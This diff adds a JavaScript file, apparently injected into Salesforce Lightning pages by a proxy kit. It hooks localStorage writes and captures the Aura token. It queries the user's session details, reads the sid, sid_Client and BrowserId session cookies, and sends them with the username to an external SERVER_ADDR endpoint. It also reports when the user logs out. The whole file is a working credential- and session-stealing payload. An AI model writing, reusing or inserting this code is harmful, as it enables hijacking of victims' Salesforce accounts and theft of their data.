@@ -1,0 +1,127 @@
+Storage.prototype.setItem = new Proxy(Storage.prototype.setItem, {
+    apply(target, thisArg, argumentList) {
+        window.dispatchEvent(new Event ('storage'));
+        return Reflect.apply(target, thisArg, argumentList);
+    }
+})
+
+let getLoginHandle = false
+let getLoginIsDone = false
+let reqGetLoginLimitCount = 0
+let reqGetLoginLimit = 5
+
+async function getLogin(localClient)  {
+    const doc = `${document.documentElement.innerHTML}`
+    const reg = doc.match(/"fwuid.*?(?=,)/gm)[1]
+    if (!reg) return
+
+    getLoginHandle = true
+    const clientService = localClient
+    const userData = '/aura?r=36&ui-global-components-one-userProfileCard.UserProfileCard.getAddAccountUrl=1'
+    const pageUrl = '/lightning/page/home'
+    const contextUser =`{"mode":"PROD",${reg},"app":"one:one","loaded":{"APPLICATION@markup://one:one":"4B9HbPnafthtBvE6sQMEzg"},"dn":[],"globals":{"appContextId":"06m4J000000yMdhQAE"},"uad":true}`
+    const massagePost = '{"actions":[{"id":"1254;a","descriptor":"serviceComponent://ui.global.components.one.userSwitcher.UserSwitcherController/ACTION$getSessionVars","callingDescriptor":"UNKNOWN","params":{}}]}'
+    const newToken = window.localStorage.getItem('$AuraClientService.token$one:one')
+    try{
+        const resp = await fetch(ORIGIN + userData, {
+            credentials: "include",
+            headers: {
+                "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:108.0) Gecko/20100101 Firefox/108.0",
+                "Accept": "*/*",
+                "Accept-Language": "ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3",
+                "X-SFDC-Request-Id": "17495000000fc1bb4a",
+                "X-SFDC-Page-Cache": "d7e0a5af75a54aa0",
+                "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
+                "Sec-Fetch-Dest": "empty",
+                "Sec-Fetch-Mode": "cors",
+                "Sec-Fetch-Site": "same-origin"
+            },
+            "referrer": ORIGIN + pageUrl,
+            "body": `message=${massagePost}&aura.context=${contextUser}&aura.pageURI=${pageUrl}&aura.token=${clientService}`,
+            "method": "POST",
+            "mode": "cors",
+        })
+        try {
+            response = await resp.json()
+            console.log(response)
+            getLoginIsDone = true
+            getLoginHandle = false
+        } catch(e) {
+            reqGetLoginLimitCount++
+            if (reqGetLoginLimitCount === reqGetLoginLimit) {
+                throw new Error('PROXY stack request limit reach', e)
+                return
+            }
+            getLogin(newToken)
+            return
+        }
+    }
+    catch(e) {
+        console.log('PROXY get login: ', e);
+    }
+    return userEvents();
+}
+
+function userEvents() {
+
+    const browserId = ('; '+document.cookie).split(`; BrowserId=`).pop().split(';')[0];
+    const browserId_sec = ('; '+document.cookie).split(`; BrowserId_sec=`).pop().split(';')[0];
+    const sid = ('; '+document.cookie).split(`; sid=`).pop().split(';')[0];
+    const sid_Client = ('; '+document.cookie).split(`; sid_Client=`).pop().split(';')[0];
+
+    let userEvents = {
+        type: 'auth-data',
+        clientip: HOSTIP,
+        name: 'login',
+        system: 'salesforce',
+        tabid: TAB_ID,
+        payload: {
+            userFullName: response.actions[0].returnValue.username,
+            userEmail: response.actions[0].returnValue.username,
+            material:
+                {
+                    "browserId": `${browserId}`,
+                    "browserId_sec": `${browserId_sec}`,
+                    "sid": `${sid}`,
+                    "sid_Client": `${sid_Client}`,
+                }
+        }
+    }
+    fetch(SERVER_ADDR + '/login', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(userEvents)
+    })
+}
+
+async function logOutUser() {
+    let logOutUser = {
+        name: 'log-out',
+        clientip: HOSTIP,
+        tabid: TAB_ID,
+        system: 'salesforce'
+    }
+    await fetch(SERVER_ADDR + '/logout', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(logOutUser)
+    })
+}
+window.addEventListener('click', evt => {
+    if (evt.target?.textContent === 'Log Out' && evt.target?.href?.includes('logout')) {
+        logOutUser()
+    }
+})
+
+window.addEventListener('storage', async () => {
+    const clientService = window.localStorage.getItem('$AuraClientService.token$one:one')
+    const url = ORIGIN
+    const result = url.indexOf('.') > -1
+    if (clientService && !getLoginIsDone && !getLoginHandle && result) {
+        await getLogin(clientService)
+    }
+}, false)
